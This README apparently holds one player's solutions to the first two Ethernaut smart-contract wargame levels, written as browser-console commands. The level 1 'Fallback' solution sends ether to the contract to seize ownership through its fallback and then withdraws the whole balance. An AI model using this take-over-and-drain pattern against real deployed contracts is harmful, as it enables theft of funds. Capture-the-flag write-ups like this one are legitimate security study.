# Ethernaut

The Ethernaut is a Web3/Solidity based wargame inspired on overthewire.org, played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'.
Here are my solutions for each level.

## 0.Hello Ethernaut

```
> contract.info()
< [[PromiseResult]]: "You will find what you need in info1()."

> contract.info1()
< [[PromiseResult]]: "Try info2(), but with \"hello\" as a parameter."

> contract.info2("hello")
< [[PromiseResult]]: "The property infoNum holds the number of the next info method to call."

> contract.abi

> let x = await contract.infoNum()

> x.toString()
< '42'

> contract.info42()
< [[PromiseResult]]: "theMethodName is the name of the next method."

> contract.theMethodName()
< [[PromiseResult]]: "The method name is method7123949."

> contract.method7123949()
< [[PromiseResult]]: "If you know the password, submit it to authenticate()."

> contract.password()
< [[PromiseResult]]: "ethernaut0"

> contract.authenticate("ethernaut0")
```

Submit the instance by clicking the orange button.

```(-(-_(-_-)_-)-) Well done, You have completed this level!!!```

## 1. Fallback

> contract.contribute({value:toWei("0.0001", "ether")})
> web3.eth.sendTransaction({to:"0x3D585bb9145ca9101D5EdA79E138D854242FF90C", 
	value:toWei("0.0001", "ether"), from:"0x76F2CCD13DB4D70DFB2114704BD9d4d6326bafA0"})
> contract.owner()
< [[PromiseResult]]: "0x76F2CCD13DB4D70DFB2114704BD9d4d6326bafA0"
> contract.withdraw()
> getBalance("0x3D585bb9145ca9101D5EdA79E138D854242FF90C")
< [[PromiseResult]]: "0"

Submit the instance by clicking the orange button.
\,,/(◣_◢)\,,/ Well done, You have completed this level!!!







